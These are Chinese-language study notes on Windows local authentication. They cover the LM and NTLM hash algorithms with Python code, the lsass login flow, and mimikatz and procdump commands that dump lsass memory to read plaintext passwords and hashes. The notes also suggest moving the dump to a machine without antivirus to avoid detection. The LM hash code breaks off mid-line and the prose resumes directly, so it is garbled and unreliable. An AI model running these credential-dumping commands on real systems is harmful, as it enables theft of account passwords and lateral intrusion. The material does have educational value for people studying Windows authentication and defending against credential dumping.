仅记录学习笔记，参考网上各位前辈的文章讲解加上个人理解。如有错误，请及时提醒，以免误导他人。
`Windows`本地登陆密码储存在位于`%SystemRoot%\system32\config\`目录的`SAM`文件中，存储内容为密码的`hash`值。当用户输入密码时，`Windows`先将用户的输入通过算法加密再与`SAM`文件存储的数据对比，一致则认证成功。
`Windows`所使用的密码`hash`有两种，`LM Hash`与`NTLM hash`。
## 0x01 LM Hash
`LM` 全称`LAN Manager` ，`LM
hash`作为`Windows`使用较早的认证协议，现已基本淘汰，仅存在于较老的系统中，如`Windows XP、Windows 2000、Windows
2003`这一类。
`LM hash`算法如下:
  * 将密码转换为大写,并转换为`16进制`字符串。
  * 密码不足`28位`，用`0`在右边补全。
  * `28位`的密码被分成两个`14位`部分，每部分分别转换成比特流，并且长度为`56`位，长度不足用`0`在左边补齐长度。
  * 两组分别再分`7位`一组末尾加`0`，再组合成一段新的字符，再转为`16`进制。
  * 两组`16进制`数，分别作为`DES key`，并为`KGS!@#$%`进行加密。
  * 将两组`DES`加密后的编码拼接，得到`LM HASH`值。
`Python3`实现`LM hash`算法：
    import binascii
    import codecs
    from pyDes import *
    def DesEncrypt(str, Key):
        k = des(Key, ECB, pad=None)
        EncryptStr = k.encrypt(str)
        return binascii.b2a_hex(EncryptStr)
    def ZeroPadding(str):
        b = []
        l = len(str)
        num = 0
        for n in range(l):
            if (num 
当密码为`123ABC`或`123456`时如下：
`LM Hash`的缺陷在于：
  * 密码不区分大小写。
  * 密码长度最大只能为`14个`字符。
  * 根据以上的图，可以发现当我们的密码不超过`7位`时，生成的`LM hash`后面的一半是固定的为`aad3b435b51404ee`，也就是说通过观察`LM hash`，够判断用户的密码是否是大于等于`7位`。
  * 哈希值没有加盐就进行验证，这使其容易受到中间人的攻击，例如哈希传递，还允许构建彩虹表。
## 0x02 NTLM Hash
`NTLM`全称`NT LAN Manager`， 目前`Windows`基本都使用`NTLM hash`。
`NTLM hash`算法如下：
  * 将用户输入转为`16进制`
  * 再经`Unicode`编码
  * 再调用`MD4`加密算法
`Python2`实现`NTLM hash`算法：
    # coding=utf-8
    import codecs
    import sys
    from Crypto.Hash import MD4
    def UnicodeEncode(str):
        b = []
        l = int(len(str) / 2)
        for i in range(l):
            b.append((str[i * 2:2 * i + 2]) + '00')
        return ''.join(b)
    def Md4Encode(str):
        h = MD4.new()
        h.update(str.decode('hex'))
        return h.hexdigest()
    if __name__ == '__main__':
        passwd = sys.argv[1]
        print('Input: ' + passwd)
        # 转hex
        passwd = codecs.encode(passwd.encode(), 'hex_codec').decode()
        print('Hex: ' + passwd)
        # 转Unicode
        passwd = UnicodeEncode(passwd)
        print('Unicode: ' + passwd)
        # 转md4
        NTLMhash = Md4Encode(passwd)
        print('NTLMhash: ' + NTLMhash)
后来在篇文章上发现了更简单的代码表现：
见
    import hashlib,binascii,sys
    print binascii.hexlify(hashlib.new("md4", sys.argv[1].encode("utf-16le")).digest())
例如`admin`经`NTLM hash`后存储的值便是`209c6174da490caeb422f3fa5a7ae634`。
`NTLM Hash`在算法上比`LM Hash`安全性更高一些。
## 0x03 本地认证流程
简洁的描述一下大致流程，当然实际上会复杂很多。
用户通过`winlogon.exe`输入密码，`lsass.exe`进程接收密码明文后，会存在内存之中并将其加密成`NTLM
hash`，再对`SAM`存储数据进行比较认证。
    graph TD
    A[winlogon.exe]-->B(User input)
    B-->C[lsass.exe]-->D{转为NTLM hash与SAM文件对比}
    D-->|相等|E(认证成功)
    D-->|不相等|F(认证失败)
## 0x04 Procdump+Mimikatz读取密码Hash
介绍完`windows`本地认证机制，可以发现在
`lsass.exe`进程中是会存在有明文密码的，于是可以直接使用`mimikatz`读取，但是这样通常会被拦截
    mimikatz.exe log "privilege::debug" "sekurlsa::logonPasswords full" exit
所以可以利用工具`procdump`将`lsass.exe` `dump`出来，拉到没有杀软的机器里面使用`mimikatz`读取密码。
    procdump64.exe -accepteula -ma lsass.exe lsass.dump
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
## 0x05 总结
这里重点讲了`LM hash`与`NTLM hash`的算法，然后简略介绍通过`Mimikatz`对`hash`的抓取，可能会有错误，多包涵，共同进步。